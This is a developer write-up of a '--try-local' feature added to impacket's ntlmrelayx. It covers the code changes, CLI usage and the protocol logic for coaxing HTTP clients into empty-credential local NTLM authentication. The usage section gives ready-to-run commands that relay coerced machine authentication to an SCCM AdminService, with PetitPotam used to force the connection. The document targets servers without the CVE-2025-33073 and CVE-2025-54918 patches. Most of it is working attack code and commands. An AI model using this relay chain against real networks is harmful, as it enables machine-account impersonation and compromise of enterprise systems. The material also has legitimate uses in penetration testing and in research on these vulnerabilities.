# ntlmrelayx --try-local Implementation

## Summary
Added `--try-local` flag to ntlmrelayx to enable HTTP local NTLM authentication by constructing proper Type 2 challenges that trigger empty credential authentication.

## Changes Made

### 1. examples/ntlmrelayx.py
- **Line 347**: Added `--try-local` argument
  ```python
  parser.add_argument('--try-local', action='store_true', 
      help='Enable HTTP local NTLM authentication (constructs proper Type 2 challenges with TargetInfo to trigger empty credential auth)')
  ```
- **Line 211**: Call `c.setTryLocal(options.try_local)` to pass option to config

### 2. impacket/examples/ntlmrelayx/utils/config.py
- **Line 49**: Added `self.try_local = False` to __init__
- **Lines 259-260**: Added setter method:
  ```python
  def setTryLocal(self, try_local):
      self.try_local = try_local
  ```

### 3. impacket/examples/ntlmrelayx/servers/httprelayserver.py
- **Lines 374-385**: Modified `do_local_auth()` to construct proper Type 2 challenges when `--try-local` is enabled:
  ```python
  if self.server.config.try_local:
      LOG.info("(HTTP): --try-local enabled, constructing proper Type 2 challenge for local auth")
      challengeMessage['domain_name'] = 'WEBDAV-SERVER'
      av_pairs = ntlm.AV_PAIRS()
      av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = 'WEBDAV-SERVER'.encode('utf-16le')
      av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = 'WORKGROUP'.encode('utf-16le')
      challengeMessage['TargetInfoFields'] = av_pairs
      challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
      challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
  ```

## What This Fixes

### Before (--try-local disabled):
- Type 2 challenge has empty TargetName: `domain_name = ""`
- Type 2 challenge has empty TargetInfo: `TargetInfoFields = ntlm.AV_PAIRS()` (no data)
- HTTP client receives incomplete Type 2 and refuses to send local auth Type 3

### After (--try-local enabled):
- Type 2 challenge includes proper TargetName: `'WEBDAV-SERVER'`
- Type 2 challenge includes proper AV_PAIRS:
  - NTLMSSP_AV_HOSTNAME: 'WEBDAV-SERVER'
  - NTLMSSP_AV_DOMAINNAME: 'WORKGROUP'
- Type 2 already includes critical flags (set on lines 367-368):
  - NTLMSSP_NEGOTIATE_TARGET_INFO (0x800000)
  - NTLMSSP_TARGET_TYPE_SERVER (0x20000)
- HTTP client receives complete Type 2 and sends Type 3 with empty credentials (local auth)

## Usage

### Basic HTTP→HTTPS Relay with Local Auth:
```bash
python3 examples/ntlmrelayx.py \
  -t https://sccm-server.domain.local/AdminService/wmi/SMS_Admin \
  --http-port 80 \
  --try-local \
  --remove-mic-partial \
  -smb2support
```

### Trigger with PetitPotam:
```bash
python3 PetitPotam.py -u '' -p '' attacker@80/test sccm-server.domain.local
```

## How It Works

1. **PetitPotam coerces target** to authenticate to attacker@80/test
2. **Client sends Type 1** (NEGOTIATE) with `SIGN=False` (second attempt after first fails)
3. **ntlmrelayx with --try-local sends Type 2** (CHALLENGE) with:
   - Proper TargetName and TargetInfo fields
   - TARGET_INFO and TARGET_TYPE_SERVER flags
   - SIGN flag mirrored from client (absent)
4. **Client sends Type 3** (AUTHENTICATE) with:
   - Empty domain: `''`
   - Empty username: `''`
   - Workstation name: `'SCCM-SERVER'`
   - This is local authentication with machine account credentials
5. **ntlmrelayx relays Type 3** to HTTPS AdminService
6. **AdminService accepts** (if pre-CVE-2025-33073 and pre-CVE-2025-54918)

## Key Discovery

The HTTP client sends **TWO** Type 1 attempts:
1. First: `SIGN=True, SEAL=False` → standard auth attempt
2. Second: `SIGN=False, SEAL=False` → **local auth attempt**

The --try-local flag ensures ntlmrelayx responds properly to the second attempt, triggering local authentication with empty credentials.

## Testing

Verified with fuzzer (http_auth_tester_full.py) that proper Type 2 challenges trigger local auth:
- Type 3 with `domain=''` and `username=''` received
- Type 3 flags: `0xa2888a05` (no SIGN, no SEAL, ALWAYS_SIGN set)
- Workstation name present in Type 3

## Compatibility

- Works with Server 2022 pre-CVE-2025-33073 patch
- May still fail due to Channel Binding Token (CBT) validation on HTTPS targets
- Use with `--remove-mic-partial` for HTTP→HTTPS relay (strips SEAL flag)
